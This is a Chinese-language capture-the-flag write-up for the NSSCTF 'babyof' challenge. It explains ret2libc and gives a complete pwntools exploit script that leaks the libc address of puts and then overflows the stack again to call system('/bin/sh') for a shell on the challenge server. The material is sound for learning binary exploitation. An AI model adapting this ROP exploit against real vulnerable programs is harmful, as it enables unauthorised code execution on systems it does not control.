NSSCTF-babyof

这是一道典型的ret2libc题目

前言

一般ret2libc过程可以总结为：

通过puts/write函数泄露got表中的puts/write函数真实地址->计算libc的基址->libc基址+任意库函数相对于libc的偏移=任意函数的真实地址->libc基址+libc中’/bin/sh’的偏移量=’/bin/sh‘的地址，system也是如此，然后构造system(‘/bin/sh’)。

一、题目描述

开启了栈不可执行。再放到ida中分析

明显存在栈溢出。并且动态链接不存在system和’/bin/sh’。满足ret2libc的条件了。

二、EXP

from pwn import*
from libcfind import*#这里我用的是github上的一个插件，感觉更方便一点，但是有一点小欠缺
context(os="linux", arch="amd64")
sh = remote('node4.anna.nssctf.cn',28364)#远程连接
#sh = process('./babyof')
elf = ELF('./babyof')#逆向文件，获取got/plt信息

put_plt = 0x00400520   #puts函数的plt表地址。用来被call

put_got = elf.got["puts"]	#要泄露的puts函数真实地址
print(hex(put_got))
main_addr = 0x0040066B		#用来返回主程序
ret = 0x00400506			#用来第二次溢出时保证system的正常调用
pop_ret_rdi = 0x00400743	#传参'/bin/sh'

#第一次溢出，泄露出puts函数真实地址
payload = 72*b'a'+p64(pop_ret_rdi)+p64(put_got)+p64(put_plt)+p64(main_addr)

sh.sendlineafter("overflow?\n",payload)

#sh.recv('win\n')

puts_real_addr= u64(sh.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))//接收puts真实地址

#puts_real_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_real_addr))

#libc_addr = finder('puts',puts_real_addr)#查找对应的libc库
#libcbase = libc_addr.libcbase  #libc版本的基址

libcbase1=0x7F169646C000
system_addr=libcbase1+0x04f550
bin_addr=libcbase1+0x1b3e1a
#system_addr = libc_addr.dump('system') #得到system的地址
#bin_addr = libc_addr.dump('str_bin_sh') #得到'/bin/sh'的地址

print("get shell")
payload = 72*b'a'+p64(ret)+p64(pop_ret_rdi)+p64(bin_addr)+p64(system_addr)+p64(main_addr)#第二次溢出

#sh.sendline(payload)
sh.sendlineafter("overflow?\n", payload)
sh.interactive()

三、总结

攻击思路：

1、泄露一个函数的真实地址

2、获取libc的版本

3、根据偏移得到system和’/bin/sh’

的地址

4、执行程序（system(‘/bin/sh’)）得到shell。

四、解惑

做这道题的时候第一次溢出的时候对返回main函数有点疑惑，后来明白在溢出函数之后返回会有一个puts函数，如果不重返main函数的话，在堆栈中无法很好的溢出。

第二处疑惑是第二次溢出时，需要一个ret跳到pop ret，查了别的资料，因为system被调用时，其中有一个汇编指令，要求栈顶16字节对齐，否则会出错。而我们为了能够正常执行跳转，又需要栈能够调整其高度，就可以通过ret+ret+…+addr的方式。这种方式就相当于是不停的pop。最后还是会执行到addr。
